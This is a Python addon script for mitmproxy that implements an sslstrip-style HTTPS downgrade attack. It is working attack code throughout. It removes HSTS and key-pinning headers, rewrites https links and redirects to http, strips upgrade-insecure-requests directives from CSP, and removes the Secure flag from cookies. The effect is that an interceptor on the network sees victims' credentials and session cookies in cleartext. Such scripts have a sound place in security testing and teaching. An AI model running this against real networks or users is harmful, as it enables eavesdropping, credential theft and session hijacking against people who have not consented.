```
"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""

import re
import urllib.parse

# Set of SSL/TLS capable hosts
secure_hosts = set()


def request(flow):
    # Remove headers that might interfere with modification
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # Proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # Ensure host header matches the intended destination
        # This avoids TLS certificate validation issues
        flow.request.host = flow.request.pretty_host


def response(flow):
    # Remove security headers that enforce HTTPS
    flow.response.headers.pop('Strict-Transport-Security', None)
    flow.response.headers.pop('Public-Key-Pins', None)

    # Replace all https:// links with http:// in body
    flow.response.content = flow.response.content.replace(b"https://", b"http://")

    # Remove meta tag that upgrades insecure requests
    csp_meta_tag_pattern = (
        b'<meta[^>]+http-equiv=["\']Content-Security-Policy["\'][^>]*upgrade-insecure-requests[^>]*>'
    )
    flow.response.content = re.sub(
        csp_meta_tag_pattern, b"", flow.response.content, flags=re.IGNORECASE
    )

    # Handle HTTPS redirections
    location = flow.response.headers.get("Location", "")
    if location.startswith("https://"):
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers["Location"] = location.replace("https://", "http://", 1)

    # Strip "upgrade-insecure-requests" from CSP headers
    csp = flow.response.headers.get("Content-Security-Policy", "")
    if re.search("upgrade-insecure-requests", csp, flags=re.IGNORECASE):
        flow.response.headers["Content-Security-Policy"] = re.sub(
            r"upgrade-insecure-requests[;\s]*", "", csp, flags=re.IGNORECASE
        )

    # Remove 'secure' flag from cookies
    cookies = flow.response.headers.get_all("Set-Cookie")
    if cookies:
        cookies = [re.sub(r";\s*secure\s*", "", s, flags=re.IGNORECASE) for s in cookies]
        flow.response.headers.set_all("Set-Cookie", cookies)
```